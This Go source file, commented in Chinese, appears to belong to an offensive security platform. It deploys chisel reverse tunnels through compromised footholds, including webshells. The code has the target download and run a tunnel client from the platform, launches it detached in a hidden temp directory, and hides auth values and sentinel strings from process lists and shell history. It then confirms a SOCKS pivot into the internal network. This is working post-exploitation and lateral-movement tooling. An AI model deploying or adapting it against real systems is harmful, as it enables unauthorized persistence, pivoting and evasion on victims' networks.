// deploy.go 是四件套之 deploy:① 平台侧起 chisel server（进程台账：pid/命令行/
// 日志落 deploy_params);② 客户端二进制经 stage 受管投递生成一次性 URL，经会话
// 下载到目标 /tmp 随机名并 chmod+x（目标无 curl/wget 回退会话分块写入
// session.WriteFile);③ 远端后台拉起（输出重定向，pid 经哨兵取回）;④ 隧道内
// 决定性验证——通才标 alive;⑤ 任一失败按 RollbackSteps 逐层回滚。
package tunnel

import (
	"context"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"log"
	"net"
	urlpkg "net/url"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"time"

	"chengjian.local/chengjian/db"
	"chengjian.local/chengjian/session"
	"chengjian.local/chengjian/stage"
)

// 部署时序参数。
const (
	serverUpWait   = 2 * time.Second  // server 进程秒退检测
	callbackWait   = 25 * time.Second // 等目标回连（反向监听口起来）
	dialProbeEvery = 500 * time.Millisecond
	verifyTimeout  = 8 * time.Second
	remoteExecWait = 120 * time.Second // 下载二进制（可能走会话分块回退）
)

// Manager 是隧道子系统的运行时：部署/验证/回滚/巡检/回收。受管资源原则——
// 所有外部暴露面（server 进程、远端进程、stage 条目、监听端口）都经它登记与回收。
type Manager struct {
	store           tunnelStore
	stage           *stage.Manager
	sessions        *session.Registry
	chiselPath      string // 空 = 二进制缺失，Deploy 返回明确错误
	chiselPathWin   string // Windows 目标用的客户端（chisel.exe）；空 = 该平台无法部署
	suo5Path        string // 空 = suo5 二进制缺失，suo5 适配器 Deploy 返回明确错误
	suo5PayloadsDir string // 空 = payloads 目录缺失，同上
	dataDir         string // 平台侧隧道工作目录（authfile/日志）
	// OnListenStart/OnListenStop 是监听端口台账钩子（server 层注册进端口审计）。
	OnListenStart func(port int)
	OnListenStop  func(port int)
	// OnStateChange 是隧道状态变化钩子（期 3b:server 层挂任务 MITM 上游热切换）。
	// 在 alive/error/stopped 每次落定后触发,参数为归属任务 id。
	OnStateChange func(taskID int64)
	// OnLifecycle 是带语义的隧道生命周期事件钩子（server 层写任务活动流）。
	// 与 OnStateChange 分开：那个只管「重算上游」，这个带事件类型与原因，
	// 供人类复盘「什么时候断的、重拉了几次、最后死在哪」。
	// nil = 不记录（测试与未装配场景）。
	OnLifecycle func(ev LifecycleEvent)
	// AuthorizeRedeploy checks current task/session authorization before health
	// maintenance starts any new deployment or cleanup for a redeployment.
	// Configure before StartHealth. Nil preserves standalone library behavior;
	// the server always installs a fail-closed authorization callback.
	AuthorizeRedeploy func(ctx context.Context, rec *db.TunnelRecord) error

	procsMu    sync.Mutex
	procs      map[int64]*managedProcess
	opsMu      sync.Mutex
	ops        map[int64]*tunnelOperation
	healthOnce sync.Once
}

// Options 是 Manager 装配输入。
type Options struct {
	Store      *db.TunnelStore
	Stage      *stage.Manager
	Sessions   *session.Registry
	ChiselPath string // CHENGJIAN_CHISEL_PATH 或 data/tools/chisel；不存在时 Deploy 明确报错
	// ChiselPathWindows 是 Windows 目标用的客户端（chisel.exe）。空 = Windows
	// 立足点无法部署 chisel 隧道（只能走 adapter=suo5）。这是「能力缺口」而不是
	// 「配置错误」：Linux 的 ELF 投到 Windows 上只会秒退，不给用户一个精确的
	// 说法就会变成「隧道建不起来、日志看不出原因」。
	ChiselPathWindows string
	// Suo5Path 是 suo5 CLI 路径（CHENGJIAN_SUO5_PATH 或 data/tools/suo5);
	// Suo5PayloadsDir 是 payload 目录（CHENGJIAN_SUO5_PAYLOADS_DIR 或 data/tools/suo5-payloads)。
	// 缺失时仅 suo5 适配器 Deploy 报明确错误，不影响 chisel。
	Suo5Path        string
	Suo5PayloadsDir string
	DataDir         string
}

// NewManager 构造运行时。chisel 存在时读 sha256 打印日志（供应链自检）。
func NewManager(o Options) (*Manager, error) {
	if o.Store == nil || o.Sessions == nil {
		return nil, fmt.Errorf("tunnel.Manager 需要 store 与 sessions")
	}
	dir := filepath.Join(o.DataDir, "tunnels")
	if err := os.MkdirAll(dir, 0o700); err != nil {
		return nil, err
	}
	m := &Manager{
		store: o.Store, stage: o.Stage, sessions: o.Sessions,
		chiselPath: o.ChiselPath, chiselPathWin: o.ChiselPathWindows, dataDir: dir,
		suo5Path: o.Suo5Path, suo5PayloadsDir: o.Suo5PayloadsDir,
		procs: map[int64]*managedProcess{},
	}
	if o.ChiselPath != "" {
		if sum, err := fileSHA256(o.ChiselPath); err != nil {
			log.Printf("[tunnel] chisel 二进制不可读（%s): %v —— Deploy 将报明确错误", o.ChiselPath, err)
			m.chiselPath = ""
		} else {
			log.Printf("[tunnel] chisel 二进制： %s sha256=%s", o.ChiselPath, sum)
		}
	} else {
		log.Printf("[tunnel] 未配置 chisel 二进制（CHENGJIAN_CHISEL_PATH 或 data/tools/chisel),tunnel_deploy 将报明确错误")
	}
	// Windows 客户端是可选的：没有它时 Windows 立足点只能走 suo5（HTTP 隧道，
	// 无目标侧进程），不是致命错误，但要在启动日志里说清楚，避免事后归因到
	// 「隧道子系统坏了」。
	if m.chiselPathWin != "" {
		if sum, err := fileSHA256(m.chiselPathWin); err != nil {
			log.Printf("[tunnel] Windows chisel 二进制不可读（%s): %v —— Windows 目标将无法部署 chisel 隧道", m.chiselPathWin, err)
			m.chiselPathWin = ""
		} else {
			log.Printf("[tunnel] Windows chisel 二进制： %s sha256=%s", m.chiselPathWin, sum)
		}
	} else {
		log.Printf("[tunnel] 未配置 Windows chisel 客户端（data/tools/chisel.exe 或 CHENGJIAN_CHISEL_WIN_PATH):" +
			"Windows 立足点（aspx/asp 马）将只能部署 adapter=suo5 的 HTTP 隧道")
	}
	if m.suo5Path != "" {
		if sum, err := fileSHA256(m.suo5Path); err != nil {
			log.Printf("[tunnel] suo5 二进制不可读（%s): %v —— suo5 适配器 Deploy 将报明确错误", m.suo5Path, err)
			m.suo5Path = ""
		} else {
			log.Printf("[tunnel] suo5 二进制： %s sha256=%s", m.suo5Path, sum)
		}
	} else {
		log.Printf("[tunnel] 未配置 suo5 二进制（CHENGJIAN_SUO5_PATH 或 data/tools/suo5),adapter=suo5 将报明确错误")
	}
	if m.suo5PayloadsDir != "" {
		if st, err := os.Stat(m.suo5PayloadsDir); err != nil || !st.IsDir() {
			log.Printf("[tunnel] suo5 payloads 目录不可读（%s) —— suo5 适配器 Deploy 将报明确错误", m.suo5PayloadsDir)
			m.suo5PayloadsDir = ""
		}
	}
	return m, nil
}

func fileSHA256(path string) (string, error) {
	f, err := os.Open(path)
	if err != nil {
		return "", err
	}
	defer f.Close()
	h := sha256.New()
	if _, err := io.Copy(h, f); err != nil {
		return "", err
	}
	return hex.EncodeToString(h.Sum(nil)), nil
}

// ChiselPath 返回已校验的 chisel 路径（空 = 缺失）。
func (m *Manager) ChiselPath() string { return m.chiselPath }

// chiselBinaryFor 按目标平台返回已校验的客户端二进制路径（"" = 该平台无可用
// 二进制）。Linux 回落 m.chiselPath，Windows 只用 m.chiselPathWin——绝不把 ELF
// 投到 Windows 上「试一下」，那只会产生一条不指向根因的失败日志。
func (m *Manager) chiselBinaryFor(p Platform) string {
	if p == PlatformWindows {
		return m.chiselPathWin
	}
	return m.chiselPath
}

// chiselPathEnvFor 返回该平台二进制的配置项名（错误信息里指路用）。
func chiselPathEnvFor(p Platform) string {
	if p == PlatformWindows {
		return "CHENGJIAN_CHISEL_WIN_PATH"
	}
	return "CHENGJIAN_CHISEL_PATH"
}

// ChiselBinaryFor 报告目标平台是否有可用的客户端二进制（"" = 没有）。
// 供选型逻辑在跑探针之前先判「这条适配器在本平台能不能成」。
func (m *Manager) ChiselBinaryFor(p Platform) string {
	return m.chiselBinaryFor(PlatformOf(string(p)))
}

// Suo5Path 返回已校验的 suo5 CLI 路径（空 = 缺失）。
func (m *Manager) Suo5Path() string { return m.suo5Path }

// CanListen 试绑平台端口（端口分配的真实检查）。
func CanListen(port int) bool {
	ln, err := net.Listen("tcp", "0.0.0.0:"+strconv.Itoa(port))
	if err != nil {
		return false
	}
	_ = ln.Close()
	return true
}

// UsedPorts 汇总活隧道台账占用的平台端口（listen/socks/local)。
func UsedPorts(recs []*db.TunnelRecord) map[int]bool {
	used := map[int]bool{}
	for _, r := range recs {
		if r.ListenPort > 0 {
			used[r.ListenPort] = true
		}
		var p Plan
		if json.Unmarshal(r.DeployParams, &p) == nil {
			if p.SocksPort > 0 {
				used[p.SocksPort] = true
			}
			if p.LocalPort > 0 {
				used[p.LocalPort] = true
			}
		}
	}
	return used
}

func (m *Manager) saveParams(ctx context.Context, id int64, p *Plan) error {
	raw, err := json.Marshal(p)
	if err != nil {
		return err
	}
	if err := m.store.UpdateDeployParams(ctx, id, p.RemotePID, raw); err != nil {
		log.Printf("[tunnel] 台账参数回写失败(id=%d): %v", id, err)
		return err
	}
	return nil
}

// Deploy 执行完整部署：建台账行 → 起 server → 投递客户端 → 远端拉起 →
// 决定性验证 → 标 alive。任一失败逐层回滚（含删台账行），返回带层级的错误。
// adapter=suo5 时分流到 deploySuo5(HTTP 隧道，无目标侧进程，覆盖无出网场景）。
func (m *Manager) Deploy(ctx context.Context, p *Plan) (*db.TunnelRecord, error) {
	if p == nil {
		return nil, fmt.Errorf("部署计划为空")
	}
	if err := ctx.Err(); err != nil {
		return nil, err
	}
	if p.Adapter == AdapterSuo5 {
		return m.deploySuo5(ctx, p)
	}
	// 平台侧 server 用本机平台二进制；目标侧 client 用目标平台二进制。
	// 两者的缺失要分开报——「平台侧没装 chisel」和「目标平台没有对应客户端」
	// 是完全不同的故障，混成一句会让人去修错地方。
	if m.chiselPath == "" {
		return nil, fmt.Errorf("chisel 二进制缺失：把对应平台的 chisel 放到 data/tools/chisel 或设 CHENGJIAN_CHISEL_PATH 后重试")
	}
	if hs := p.host(); m.chiselBinaryFor(hs.Platform()) == "" {
		return nil, fmt.Errorf("%s 目标需要 %s 形态的隧道客户端，当前未配置（%s）；"+
			"把对应二进制放到 data/tools/%s 或设 %s 后重试。"+
			"也可以改用 adapter=suo5——HTTP 隧道不投递任何目标侧进程，Windows 立足点无需额外二进制",
			hs.Platform(), hs.BinName(), chiselPathEnvFor(hs.Platform()), hs.BinName(), chiselPathEnvFor(hs.Platform()))
	}
	if p.Kind == KindSocks && p.SocksPort <= 0 || p.Kind == KindPortfwd && p.LocalPort <= 0 {
		return nil, fmt.Errorf("计划缺收入口端口（socks_port/local_port)")
	}
	sess, ok := m.sessions.Get(p.ViaSessionID)
	if !ok {
		return nil, fmt.Errorf("会话 %d 不在注册表，无法部署", p.ViaSessionID)
	}
	rec := &db.TunnelRecord{
		TaskID: p.TaskID, Kind: p.Kind, Adapter: p.Adapter,
		ListenHost: p.ListenHost, ListenPort: p.ListenPort,
		TargetHost: p.TargetHost, TargetPort: p.TargetPort,
		ViaSessionID: p.ViaSessionID, State: db.TunnelDeploying,
	}
	raw, _ := json.Marshal(p)
	rec.DeployParams = raw
	id, err := m.store.Create(ctx, rec)
	if err != nil {
		return nil, fmt.Errorf("台账落库失败: %w", err)
	}
	ctx, release, err := m.beginOperation(ctx, id, false)
	if err != nil {
		m.discardUnstarted(ctx, id)
		return nil, err
	}
	unstarted := true
	defer func() {
		release()
		if unstarted {
			m.discardUnstarted(ctx, id)
		}
	}()
	current, err := m.store.Get(ctx, id)
	if err != nil || current == nil || current.State != db.TunnelDeploying {
		if err == nil {
			err = fmt.Errorf("隧道 %d 已停止或不再等待部署", id)
		}
		return nil, err
	}
	unstarted = false
	if err := m.deployInto(ctx, id, sess, p); err != nil {
		m.rollback(ctx, id, sess, p)
		return nil, err
	}
	if err := m.store.UpdateState(ctx, id, db.TunnelAlive, ""); err != nil {
		m.rollback(ctx, id, sess, p)
		return nil, fmt.Errorf("隧道状态回写失败: %w", err)
	}
	// 部署完成且已过隧道内决定性验证 —— 这是内网作战的关键转折点，派发生命周期
	// 事件供 server 写任务活动流（人看时序）。
	m.notifyLifecycle(LifecycleEvent{
		Kind: LifecycleDeployed, TunnelID: id, TaskID: p.TaskID,
		Adapter: p.Adapter, SocksPort: p.SocksPort,
	})
	m.notifyState(p.TaskID)
	return m.store.Get(ctx, id)
}

// notifyState 触发状态变化钩子（server 层据此热切换任务 MITM 上游）。
func (m *Manager) notifyState(taskID int64) {
	if m.OnStateChange != nil && taskID > 0 {
		m.OnStateChange(taskID)
	}
}

// deployInto 按层推进，每层成功即把台账参数落库（进程台账逐层补齐）。
func (m *Manager) deployInto(ctx context.Context, id int64, sess session.Session, p *Plan) error {
	if err := ctx.Err(); err != nil {
		return err
	}
	// 层 1：平台侧 chisel server(authfile 0600,auth 不进命令行）。
	if err := os.WriteFile(p.AuthFile, []byte(p.AuthfileContent()), 0o600); err != nil {
		return fmt.Errorf("层 server_process: authfile 写入失败: %w", err)
	}
	logFile, err := os.OpenFile(p.ServerLog, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0o600)
	if err != nil {
		return fmt.Errorf("层 server_process: 日志打开失败: %w", err)
	}
	cmd := exec.Command(m.chiselPath, p.ServerArgs...)
	cmd.Stdout, cmd.Stderr = logFile, logFile
	if err := cmd.Start(); err != nil {
		_ = logFile.Close()
		return fmt.Errorf("层 server_process: 启动失败: %w", err)
	}
	p.ServerPID = cmd.Process.Pid
	proc := m.trackProcess(id, cmd, logFile)
	if err := m.saveParams(ctx, id, p); err != nil {
		return err
	}
	if m.OnListenStart != nil {
		m.OnListenStart(p.ListenPort)
	}
	select {
	case <-ctx.Done():
		return ctx.Err()
	case <-proc.done:
		return fmt.Errorf("层 server_process: chisel server 秒退（日志 %s)", p.ServerLog)
	case <-time.After(serverUpWait):
	}

	// 层 2：客户端二进制受管投递（stage 一次性 URL;curl → wget/ certutil → 会话分块写入）。
	// Windows 的 %TEMP% 表达式在这一层之前必须先解析成字面路径，否则后续所有
	// 命令（chmod/拉起/清理）都会拿到未展开的 %TEMP%，而它们不在 cmd 上下文里。
	if err := m.resolveRemotePaths(ctx, id, sess, p); err != nil {
		return fmt.Errorf("层 stage_entry: %w", err)
	}
	if err := m.deliver(ctx, sess, p); err != nil {
		return fmt.Errorf("层 stage_entry: %w", err)
	}
	if err := m.saveParams(ctx, id, p); err != nil {
		return err
	}

	// 层 3：远端后台拉起（AUTH 走环境变量，不进 ps cmdline;setsid+nohup 脱离会话）。
	pid, err := m.spawnRemote(ctx, sess, p)
	if err != nil {
		return fmt.Errorf("层 remote_process: %w", err)
	}
	p.RemotePID = pid
	if err := m.saveParams(ctx, id, p); err != nil {
		return err
	}

	// 层 4：隧道内决定性验证。反向监听口 accept ≠ 目标可达，必须真实拨测。
	if err := m.verify(ctx, sess, p); err != nil {
		return fmt.Errorf("层 verify: %w", err)
	}
	return nil
}

// resolveRemotePaths 把远端目录表达式解析成字面路径并回写台账。
//
// Linux 的计划里 RemoteDir 本来就是字面量（/tmp/.<tag>），DirExprCmd 返回空串，
// 这里直接返回——不产生任何额外命令，既有行为零变化。
//
// Windows 的 %TEMP% 必须经目标 shell 展开：IIS 应用池身份的 %TEMP% 在不同机器上
// 可能是 C:\Windows\Temp 也可能是用户目录。台账里存表达式是错的——重启后清理
// 走的是 plan 反序列化 + 非 cmd 上下文，%TEMP% 不会被展开，rmdir 会删一个
// 叫 "%TEMP%\xxxx" 的相对路径（失败或误删）。
func (m *Manager) resolveRemotePaths(ctx context.Context, id int64, sess session.Session, p *Plan) error {
	hs := p.host()
	cmd := hs.DirExprCmd()
	if cmd == "" {
		return nil
	}
	// 重拉时 RemoteDir 已经解析过（台账里存的是字面路径）：不再打一条目标侧命令。
	// 这既是省一次往返，也是避免在断链重拉的紧张路径上多一个可能失败的步骤。
	if !strings.Contains(p.RemoteDir, "%") {
		return nil
	}
	stdout, _, err := sess.Exec(ctx, cmd, probeTimeout)
	if err != nil {
		return fmt.Errorf("解析目标临时目录失败（%s 平台）: %w", hs.Platform(), err)
	}
	base, err := hs.ParseDirExpr(stdout)
	if err != nil {
		return fmt.Errorf("解析目标临时目录失败（%s 平台）: %w", hs.Platform(), err)
	}
	p.RemoteDir = strings.Replace(p.RemoteDir, "%TEMP%", base, 1)
	p.RemoteBin = hs.Join(p.RemoteDir, hs.BinName())
	p.RemoteLog = hs.Join(p.RemoteDir, "run.log")
	return m.saveParams(ctx, id, p)
}

// deliver 经 stage 投递客户端二进制到目标 RemoteBin 并按平台置可执行。
//
// 命令本体由 HostShell 生成（见 platform.go）：Linux 是 mkdir -p + curl/wget +
// chmod +x，Windows 是 if not exist mkdir + curl.exe/certutil + 无需 chmod。
// 这里只负责「投递 → 解析哨兵 → 失败回退会话分块写入」的流程。
func (m *Manager) deliver(ctx context.Context, sess session.Session, p *Plan) error {
	if m.stage == nil {
		return fmt.Errorf("stage 暂存服务未启用，无法投递")
	}
	hs := p.host()
	// 目标平台要有对应形态的客户端二进制：Windows 目标拿到 Linux ELF 会在
	// 拉起时立刻失败，且报错是「进程秒退」这种不指向根因的形态。
	binPath := m.chiselBinaryFor(hs.Platform())
	if binPath == "" {
		return fmt.Errorf("%s 目标需要 %s 形态的隧道客户端：把 %s 放到 %s 或设 %s 后重试"+
			"（否则 Windows 立足点只能走 adapter=suo5 的 HTTP 隧道）",
			hs.Platform(), hs.BinName(), hs.BinName(),
			filepath.Join(filepath.Dir(m.chiselPath), hs.BinName()), chiselPathEnvFor(hs.Platform()))
	}
	entry, err := m.stage.PutFile(binPath, stage.PutOpts{
		OneShot: true, TaskID: strconv.FormatInt(p.TaskID, 10),
	})
	if err != nil {
		return fmt.Errorf("stage 投递失败: %w", err)
	}
	p.StageToken = entry.Token
	// stage URL 主机是平台主监听地址（0.0.0.0 时还是回环占位），目标未必可达；
	// 换成 callback host（目标回连平台用的地址），端口保留主监听口。
	dlURL := rewriteURLHost(entry.URL, p.PlatformAddr)
	// 哨兵每次部署随机(批 7 补漏:固定 CHENGJIAN_* 字样会留在目标 shell history)。
	mk, err := randTag()
	if err != nil {
		return fmt.Errorf("哨兵生成失败: %w", err)
	}
	stdout, _, err := sess.Exec(ctx, hs.DeliverCmd(dlURL, p.RemoteBin, p.RemoteDir, mk), remoteExecWait)
	if err == nil && strings.Contains(stdout, mk+"_OK") {
		return m.chmodRemote(ctx, sess, p)
	}
	// 回退：目标无 curl/wget（或被拦）——经会话分块写入（session.WriteFile 内部分块）。
	log.Printf("[tunnel] 目标直接下载失败（%s 平台），回退会话分块写入（%s)…", hs.Platform(), p.RemoteDir)
	data, rerr := os.ReadFile(binPath)
	if rerr != nil {
		return fmt.Errorf("读取本地隧道客户端失败: %w", rerr)
	}
	if _, _, err := sess.Exec(ctx, hs.Mkdir(p.RemoteDir), probeTimeout); err != nil {
		return fmt.Errorf("远端目录创建失败: %w", err)
	}
	if err := sess.WriteFile(ctx, p.RemoteBin, data); err != nil {
		return fmt.Errorf("会话分块写入失败: %w", err)
	}
	return m.chmodRemote(ctx, sess, p)
}

// rewriteURLHost 把 stage URL 的主机名替换为 callback host（端口保留）。
// 解析失败时原样返回（诚实降级，目标下载失败还有会话分块写入兜底）。纯函数。
func rewriteURLHost(rawURL, platformAddr string) string {
	cbHost, _, err := net.SplitHostPort(platformAddr)
	if err != nil || cbHost == "" {
		return rawURL
	}
	u, err := urlpkg.Parse(rawURL)
	if err != nil || u.Host == "" {
		return rawURL
	}
	_, port, _ := net.SplitHostPort(u.Host)
	if port == "" {
		u.Host = cbHost
	} else {
		u.Host = net.JoinHostPort(cbHost, port)
	}
	return u.String()
}

func (m *Manager) chmodRemote(ctx context.Context, sess session.Session, p *Plan) error {
	hs := p.host()
	mk, err := randTag()
	if err != nil {
		return fmt.Errorf("哨兵生成失败: %w", err)
	}
	cmd := hs.ChmodCmd(p.RemoteBin, mk)
	if cmd == "" {
		// 该平台没有执行位概念（Windows 靠 .exe 后缀）。不产生任何目标侧命令，
		// 也不假装做了一次权限检查。
		return nil
	}
	stdout, _, err := sess.Exec(ctx, cmd, probeTimeout)
	if err != nil {
		return fmt.Errorf("chmod 执行失败: %w", err)
	}
	if !strings.Contains(stdout, mk+"_OK") {
		if hs.IsWindows() {
			return fmt.Errorf("置执行位失败（%s): %s", hs.Platform(), detailOf(stdout))
		}
		return fmt.Errorf("chmod 失败（目标可能 noexec 挂载 /tmp): %s", detailOf(stdout))
	}
	return nil
}

// spawnRemote 远端后台拉起 client，经哨兵取回真实 pid。
func (m *Manager) spawnRemote(ctx context.Context, sess session.Session, p *Plan) (int, error) {
	hs := p.host()
	mk, err := randTag()
	if err != nil {
		return 0, fmt.Errorf("哨兵生成失败: %w", err)
	}
	// AUTH 经 env 注入（chisel client 在 --auth 缺省时读 AUTH env)——auth 不出现在
	// 目标机 ps cmdline;取舍：/proc/<pid>/environ 对同 uid 仍可见，目标已是立足点，可接受。
	// Windows 走 $env:AUTH（同样不进命令行），pid 经 Start-Process -PassThru 取回。
	spawn := hs.SpawnCmd(p.RemoteDir, p.RemoteBin, p.RemoteLog, p.AuthUser, p.AuthPass, p.ClientArgs, mk)
	stdout, _, err := sess.Exec(ctx, spawn, probeTimeout)
	if err != nil {
		return 0, fmt.Errorf("拉起命令失败（%s 平台）: %w", hs.Platform(), err)
	}
	_, after, found := strings.Cut(stdout, mk+"_PID=")
	if !found {
		hint := ""
		if hs.IsWindows() {
			hint = "；Windows 拉起依赖 PowerShell Start-Process，若被 AppLocker/ConstrainedLanguage 限制，" +
				"该会话建不了 chisel 隧道——改用 adapter=suo5（HTTP 隧道，无目标侧进程）"
		}
		return 0, fmt.Errorf("未取到远端 pid（哨兵缺失，%s 平台）%s: %s", hs.Platform(), hint, detailOf(stdout))
	}
	pidStr := strings.Fields(after)
	if len(pidStr) == 0 {
		return 0, fmt.Errorf("远端 pid 解析失败： %s", detailOf(stdout))
	}
	pid, err := strconv.Atoi(strings.TrimSpace(pidStr[0]))
	if err != nil || pid <= 0 {
		return 0, fmt.Errorf("远端 pid 非法 %q", pidStr[0])
	}
	return pid, nil
}

// verify 等回连入口起来后做决定性验证。
func (m *Manager) verify(ctx context.Context, sess session.Session, p *Plan) error {
	entry := m.entryAddr(p)
	// 等反向入口监听起来（= 目标已回连）。
	deadline := time.Now().Add(callbackWait)
	up := false
	for time.Now().Before(deadline) {
		conn, err := net.DialTimeout("tcp", entry, dialProbeEvery)
		if err == nil {
			_ = conn.Close()
			up = true
			break
		}
		select {
		case <-ctx.Done():
			return ctx.Err()
		case <-time.After(dialProbeEvery):
		}
	}
	if !up {
		return fmt.Errorf("等待回连超时（%v 内 %s 未起监听；可能出网被拦/端口白名单，先 tunnel_probe 复核）", callbackWait, entry)
	}
	switch p.Kind {
	case KindSocks:
		// 验证目标候选按序尝试,任一通过即算隧道通:
		// 1) 显式 verify_addr(默认=立足点 webshell 地址,但经 NAT/端口映射时
		//    该地址对目标侧无意义——实战:host:8082 映射到容器:8080,容器回环无 8082);
		// 2) 隧道自环 callbackHost:listenPort(chisel server 自身,client 已连上
		//    故目标侧必可达)——经 socks 拨回服务端即证明隧道双向承载,无 NAT 假设。
		cands := []string{}
		if p.VerifyAddr != "" {
			cands = append(cands, p.VerifyAddr)
		}
		cands = append(cands, p.PlatformAddr)
		var lastErr error
		for _, addr := range cands {
			if addr == "" {
				continue
			}
			if err := socks5Dial(entry, addr, verifyTimeout); err == nil {
				if addr == p.PlatformAddr {
					log.Printf("[tunnel] socks 经自环 %s 验证通过(隧道双向承载确认)", addr)
				}
				return nil
			} else {
				lastErr = err
			}
		}
		if lastErr != nil {
			return fmt.Errorf("经 socks5 拨测全部候选失败（入口起≠隧道通）: %w", lastErr)
		}
		log.Printf("[tunnel] socks 入口已起，但未给 verify_addr，决定性验证降级为「入口可连」")
		return nil
	case KindPortfwd:
		// 预检：目标侧真实可达 target:port（反向监听对失败拨号也会 accept，不能只信入口）。
		mk, merr := randTag()
		if merr != nil {
			return fmt.Errorf("哨兵生成失败: %w", merr)
		}
		stdout, _, err := sess.Exec(ctx, p.host().TCPReachCmd(p.TargetHost, p.TargetPort, mk), probeTimeout)
		if err != nil || !strings.Contains(stdout, mk+"_OK") {
			return fmt.Errorf("目标侧预检 %s:%d 不可达（从立足点实测，%s 平台）: %s",
				p.TargetHost, p.TargetPort, p.host().Platform(), detailOf(stdout))
		}
		conn, err := net.DialTimeout("tcp", entry, verifyTimeout)
		if err != nil {
			return fmt.Errorf("经隧道访问 %s 失败： %w", entry, err)
		}
		_ = conn.SetDeadline(time.Now().Add(3 * time.Second))
		_, _ = conn.Write([]byte("\r\n")) // 轻探：部分服务收到任意字节即回 banner/错误，证明双向通
		_ = conn.Close()
	}
	return nil
}

// entryAddr 是平台回环上的隧道入口（socks5 或转发口）。
func (m *Manager) entryAddr(p *Plan) string {
	port := p.SocksPort
	if p.Kind == KindPortfwd {
		port = p.LocalPort
	}
	return net.JoinHostPort("127.0.0.1", strconv.Itoa(port))
}

// EntryAddr 对外暴露入口地址（工具返回 socks_addr/forward_addr 用）。
func (m *Manager) EntryAddr(p *Plan) string { return m.entryAddr(p) }

// PlanDataDir 是平台侧隧道工作目录（PlanOpts.DataDir 用它）。
func (m *Manager) PlanDataDir() string { return m.dataDir }

// OccupiedPorts 汇总未终结隧道占用的平台端口（端口分配用）。
func (m *Manager) OccupiedPorts(ctx context.Context) (map[int]bool, error) {
	recs, err := m.store.ListActive(ctx)
	if err != nil {
		return nil, err
	}
	return UsedPorts(recs), nil
}

// ActiveRecords 返回全部未终结（deploying|alive|error）台账行。
func (m *Manager) ActiveRecords(ctx context.Context) ([]*db.TunnelRecord, error) {
	return m.store.ListActive(ctx)
}

// TaskRecords 返回某任务的全部台账行。
func (m *Manager) TaskRecords(ctx context.Context, taskID int64) ([]*db.TunnelRecord, error) {
	return m.store.ListByTask(ctx, taskID)
}

// Get 按 id 读单条隧道台账。多级隧道（P3-2）用它取父隧道校验状态与 socks 端口。
// 不存在返回 (nil, nil)——调用方自己判空，与 store.Get 的契约一致。
func (m *Manager) Get(ctx context.Context, id int64) (*db.TunnelRecord, error) {
	if m == nil || m.store == nil || id <= 0 {
		return nil, nil
	}
	return m.store.Get(ctx, id)
}

// rollback 按 RollbackSteps 逐层回滚（best-effort，每层失败只记日志继续收）。
func (m *Manager) rollback(ctx context.Context, id int64, sess session.Session, p *Plan) {
	log.Printf("[tunnel] 部署失败逐层回滚(id=%d)", id)
	ctx, cancel := cleanupContext(ctx)
	defer cancel()
	p.CleanupPending = true
	if err := m.saveParams(ctx, id, p); err != nil {
		log.Printf("[tunnel] 回滚停止意图回写失败(id=%d): %v", id, err)
	}
	if err := m.cleanupResources(ctx, id, p); err != nil {
		_ = m.store.UpdateState(ctx, id, db.TunnelError, "回滚清理未完成: "+err.Error())
		m.notifyState(p.TaskID)
		return
	}
	if err := m.store.Delete(ctx, id); err != nil {
		log.Printf("[tunnel] 台账行删除失败(id=%d): %v", id, err)
		_ = m.store.UpdateState(ctx, id, db.TunnelError, "清理未完成: 台账删除失败: "+err.Error())
	}
}

// killRemote 经会话杀目标侧进程：先确认 pid 活着且身份匹配（命令行含远端
// 二进制路径）——查【远端】，且防 pid 复用误杀（PivotHub 查本机的缺陷在此修正）。
//
// 平台差异全部由 HostShell 承担：Linux 走 kill -0 + /proc/<pid>/cmdline +
// readlink /proc/<pid>/exe；Windows 走 Get-CimInstance Win32_Process 的
// CommandLine（wmic 在 Win11 24H2 已移除，不能用）+ Stop-Process。两条路径都
// 保留「先核对身份再动手」的顺序——这是本函数存在的理由，不是可选的优化。
func (m *Manager) killRemote(ctx context.Context, sess session.Session, p *Plan) error {
	if p.RemotePID <= 0 {
		return nil
	}
	if p.RemoteBin == "" {
		return fmt.Errorf("缺远端进程身份，拒绝清理 pid %d", p.RemotePID)
	}
	hs := p.host()
	mk, merr := randTag()
	if merr != nil {
		return merr
	}
	stdout, _, err := sess.Exec(ctx, hs.KillInspectCmd(p.RemotePID, p.RemoteBin, mk), probeTimeout)
	if err != nil {
		return fmt.Errorf("远端进程状态未确认: %w", err)
	}
	if strings.Contains(stdout, mk+"_NOPROC") {
		return nil // 远端已不在，无需杀
	}
	if !hs.KillIdentityMatches(stdout, p.RemoteBin) {
		log.Printf("[tunnel] 远端 pid %d 命令行不含 %s（pid 可能复用），跳过 kill: %s", p.RemotePID, p.RemoteBin, detailOf(stdout))
		return fmt.Errorf("远端 pid %d 身份不匹配，未确认清理", p.RemotePID)
	}
	// Recheck executable ownership before each signal. The original pid can
	// disappear and be reused between the inspection and the forced stop.
	stdout, _, err = sess.Exec(ctx, hs.KillStopCmd(p.RemotePID, p.RemoteBin, mk), probeTimeout)
	if err != nil {
		return fmt.Errorf("远端进程清理失败: %w", err)
	}
	if !strings.Contains(stdout, mk+"_OK") {
		return fmt.Errorf("远端 pid %d 停止未确认: %s", p.RemotePID, detailOf(stdout))
	}
	return nil
}

// killServer 杀平台侧 server 进程（优先本进程台账句柄；否则核对 /proc cmdline 后杀）。
func (m *Manager) killServer(id int64, p *Plan) error {
	m.procsMu.Lock()
	managed := m.procs[id]
	m.procsMu.Unlock()
	if managed != nil {
		if err := managed.cmd.Process.Kill(); err != nil && !errors.Is(err, os.ErrProcessDone) {
			return err
		}
		select {
		case <-managed.done:
		case <-time.After(2 * time.Second):
			return fmt.Errorf("平台进程 pid %d 停止未确认", p.ServerPID)
		}
		m.procsMu.Lock()
		if m.procs[id] == managed {
			delete(m.procs, id)
		}
		m.procsMu.Unlock()
	} else if p.ServerPID > 0 && processAlive(p.ServerPID) {
		if !serverCmdlineMatches(p) {
			return fmt.Errorf("平台 pid %d 身份未确认，拒绝误杀", p.ServerPID)
		}
		proc, err := os.FindProcess(p.ServerPID)
		if err != nil {
			return err
		}
		defer proc.Release()
		if err := proc.Kill(); err != nil && !errors.Is(err, os.ErrProcessDone) {
			return err
		}
	}
	if m.OnListenStop != nil {
		m.OnListenStop(p.ListenPort)
	}
